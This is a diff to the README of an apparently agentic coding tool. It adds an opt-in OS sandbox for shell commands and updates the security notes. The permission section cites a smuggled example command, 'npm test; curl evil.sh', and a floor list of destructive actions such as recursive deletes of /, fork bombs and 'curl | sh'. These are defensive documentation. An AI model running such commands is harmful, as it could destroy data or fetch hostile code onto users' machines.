@@ -135,6 +135,7 @@ Prefer your terminal's own scrollback? Run `amness --inline` (or set `ui: "inlin
 | `/loop` (alias `/trace`) | step-by-step trace of the agent loop: each model turn, its tools and timings, and any guard that fired |
 | `/tokens` (alias `/cost`) | context gauge, what fills it, tokens, cache hits, estimated cost |
 | `/memory` · `/init` | list notes · `forget` `add` `stale` `prune` `consolidate` `graph` `embeddings` · have the agent write `AGENTS.md` |
+| `/sandbox [off\|workspace\|strict]` | OS sandbox for shell commands |
 | `/procs` | background processes the agent started (`/procs stop <id>`) |
 | `/reviewer [on\|off]` | independent reviewer: acceptance criteria first, a check before work is accepted |
 | `/hooks` · `/permissions` | lifecycle hooks in effect · permission rules (list, or `allow`/`ask`/`deny <rule>`) |
@@ -154,6 +155,8 @@ Prefer your terminal's own scrollback? Run `amness --inline` (or set `ui: "inlin
 ```
 
 Precedence: **built-in floor > deny > ask > allow > the permission mode.** Shell rules match each piece of a compound command (`a && b | c`) separately, so `npm test; curl evil.sh` is not covered by an `npm test*` allow rule, and a command with a subshell or backticks never matches an allow rule. Paths are relative to the project. The **floor holds in every mode, yolo included**: recursive deletes of `/`, your home folder or a parent folder, formatting or writing to disks, fork bombs, force-pushes to main or master, and edits to `.git/` or to these rule and hook files are refused (the agent cannot rewrite its own policy), and `curl | sh` and force-pushes always ask. Allow rules in a project file are only honoured after you approve that exact file (deny and ask rules always apply, since they only restrict). The approval dialog can save a rule ("always allow `npm *` in this project"), and `/permissions` lists rules or adds one (`/permissions deny sh(git push*)`).
+
+**OS sandbox (opt-in).** The permission prompts are a policy; the sandbox is enforcement. `/sandbox workspace` (or `--sandbox workspace`, or `sandbox` in the config) runs every shell command, including background ones, under macOS Seatbelt or Linux Bubblewrap: commands can read the machine but write only in the project, temp folders and common package caches, `.git` and the rule files stay read-only, and in `/sandbox strict` the network is cut as well (so `npm install` will fail). It makes yolo mode far safer. If a sandbox is requested where none exists (Windows, or Linux without `bwrap`), commands are refused instead of silently running unprotected. The file tools were already confined to the workspace.
 
 **Editing.** Four ways to change files, all subject to read-before-edit and the same permission rules: `edit_file` (exact, unique match; or an `edits` list of several replacements applied in order, all or nothing; text that differs only in indentation is still matched when it is unique, and the result says so), `write_file`, and `apply_patch` for changes that span files. `apply_patch` takes the envelope used by Codex (`*** Begin Patch`, `*** Update File: path` with `@@` hunks, `*** Add File`, `*** Delete File`, `*** Move to`, `*** End Patch`) or an ordinary unified diff, applies hunks in order (an `@@ function name` anchor narrows the search), and is **atomic**: if any hunk of any file fails, nothing is written and every failure is named. A patch is judged file by file by permission rules, so one denied file denies the patch.
 
@@ -408,7 +411,7 @@ The method follows recent evaluation practice: harness choice can change cost pe
 
 - **Data leaves your machine only to the provider you configure** (plus web search/fetch if you use the research agent). There is no telemetry. OpenAI requests are stateless by default (`store: false`).
 - **Keys** come from environment variables or `~/.amness/config.json` (mode 600). They are never written into a project.
-- **File tools are confined to the workspace** and enforce read-before-edit. **Shell commands are not sandboxed:** `sh` can do whatever your user can. The permission prompts are the safeguard, so read them, and prefer `plan` or `default` mode on code you do not trust.
+- **File tools are confined to the workspace** and enforce read-before-edit. **Shell commands are not sandboxed unless you turn the sandbox on** (`/sandbox workspace`, macOS and Linux with bubblewrap): otherwise `sh` can do whatever your user can, and the permission prompts and the safety floor are the safeguards, so read them, and prefer the sandbox, `plan` or `default` mode on code you do not trust.
 - **Treat project-supplied context as untrusted.** Memory notes and `.amness/commands/` from a repository you cloned can contain prompt injection (so can `AGENTS.md`, which is loaded automatically). Notes are presented to the model as hints to verify, and risky actions still need your approval.
 - The browser live view listens on `127.0.0.1` only, rejects foreign `Host` headers, and renders diffs as text, never HTML.
 - `.amness/` holds per-project state (chats, checkpoints, handoffs, memory). Add it to your `.gitignore`, except `memory/` and `commands/` if you want to share those.
